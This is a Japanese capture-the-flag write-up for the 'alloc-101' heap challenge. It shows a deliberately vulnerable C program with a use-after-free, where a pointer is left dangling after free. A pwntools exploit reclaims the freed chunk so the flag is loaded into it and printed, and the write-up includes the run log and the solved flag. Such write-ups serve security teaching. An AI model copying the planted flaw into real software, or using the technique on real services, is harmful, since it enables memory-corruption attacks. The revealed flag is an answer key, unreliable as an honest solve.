# alloc-101

> スタックチャレンジにはもう飽きましたか????
>
> nc 34.170.146.252 31651

[alloc-101.tar.gz](https://alpacahack-prod.s3.ap-northeast-1.amazonaws.com/d71aeb4d-b90a-4db2-8fc1-5ce61a7e8d35/alloc-101.tar.gz)

解答すると以下のファイルがある。
```
alloc-101/
alloc-101/flag.txt
alloc-101/compose.yaml
alloc-101/chall
alloc-101/Dockerfile
alloc-101/chall.c
```

chall.c
```c
// gcc chal.c -o chal

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

char *item;

void menu() {
    puts("1. allocate");
    puts("2. free");
    puts("3. read");
    puts("4. allocate flag");
}

int main(void) {
    FILE *f_ptr = fopen("/flag.txt","r");
    if (f_ptr == NULL) {
        puts("open flag.txt failed. please open a ticket");
        exit(1);
    }
    fseek(f_ptr,0,SEEK_END);
    long f_sz = ftell(f_ptr);
    printf("file information: %ld bytes\n",f_sz);
    fseek(f_ptr,0,SEEK_SET);
    menu();
    while(1) {
        int choice;
        printf("choice> ");
        scanf("%d%*c",&choice);
        switch(choice) {
            case 1: {
                printf("size> ");
                int size;
                scanf("%d%*c",&size);
                item = malloc(size);
                printf("[DEBUG] item: %p\n",item);
            }
            break;
            case 2: {
                assert(item != NULL);
                free(item);
                //item == NULL;
            }
            break;
            case 3: {
                assert(item != NULL);
                puts(item);
            }
            break;
            case 4: {
                char *flag = malloc(f_sz);
                printf("[DEBUG] flag: %p\n",flag);
                fgets(flag,f_sz,f_ptr);
            }
            break;
            default: {
                exit(0);
            }
        }
    }
}

__attribute__((constructor))
void setup() {
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
}
```

checksecで確認すると、PIEが有効だと分かる。
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   80 Symbols        No    0      2chall
```

コードをよく見ると
```c
case 2: {
    assert(item != NULL);
    free(item);
    //item == NULL;
}
```
となっており、itemはfree後のアドレスを示し続けている。

case3の以下のコードはflag表示に使えそう
```c
case 3: {
    assert(item != NULL);
    puts(item);
}
```

UAF問題っぽい


exploit
```py
from pwn import *

# ログレベルをDEBUGにすると通信内容が全て見えて便利です
context.log_level = 'debug'

host = "34.170.146.252"
port = 31651

io = remote(host, port)

# 1. ファイルサイズを取得
io.recvuntil(b"file information: ")
f_sz_bytes = io.recvuntil(b" bytes", drop=True)
f_sz = int(f_sz_bytes)
log.info(f"Flag size: {f_sz}")

# メニュー待ちの関数（出力を捨ててプロンプトまで進める）
def wait_menu():
    io.recvuntil(b"choice> ")

# --- 攻撃開始 ---

wait_menu()

# 手順1: allocate
# フラグと同じサイズを確保することが重要！
io.sendline(b"1")
io.recvuntil(b"size> ")
io.sendline(str(f_sz).encode())
log.info("Allocated memory with size " + str(f_sz))

wait_menu()

# 手順2: free
# 確保した場所を解放（itemはまだそこを指している）
io.sendline(b"2")
log.info("Freed memory")

wait_menu()

# 手順3: allocate flag
# システムが malloc(f_sz) を行う。
# 直前に free したサイズと同じなので、同じ場所（itemが指している場所）が再利用される！
io.sendline(b"4")
log.info("Allocated flag (should reuse freed chunk)")

wait_menu()

# 手順4: read
# item（＝フラグが入った場所）を表示させる
io.sendline(b"3")

# フラグが表示されるはずなので、対話モードに入って確認する
# スクリプトで自動受信して失敗するより、目視確認が確実です
io.interactive()
```

実行する

```bash
> python solve.py
[+] Opening connection to 34.170.146.252 on port 31651: Done
[DEBUG] Received 0x1b bytes:
    b'file information: 32 bytes\n'
[*] Flag size: 32
[DEBUG] Received 0x35 bytes:
    b'1. allocate\n'
    b'2. free\n'
    b'3. read\n'
    b'4. allocate flag\n'
    b'choice> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x6 bytes:
    b'size> '
[DEBUG] Sent 0x3 bytes:
    b'32\n'
[*] Allocated memory with size 32
[DEBUG] Received 0x1d bytes:
    b'[DEBUG] item: 0x55e521e90490\n'
[DEBUG] Received 0x8 bytes:
    b'choice> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[*] Freed memory
[DEBUG] Received 0x8 bytes:
    b'choice> '
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[*] Allocated flag (should reuse freed chunk)
[DEBUG] Received 0x1d bytes:
    b'[DEBUG] flag: 0x55e521e90490\n'
[DEBUG] Received 0x8 bytes:
    b'choice> '
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[*] Switching to interactive mode
[DEBUG] Received 0x1f bytes:
    b'Alpaca{dive_into_heap_23af5b4f}'
Alpaca{dive_into_heap_23af5b4f}[DEBUG] Received 0x9 bytes:
    b'\n'
    b'choice> '

choice> $
[*] Closed connection to 34.170.146.252 port 31651
```

flag: `Alpaca{dive_into_heap_23af5b4f}`
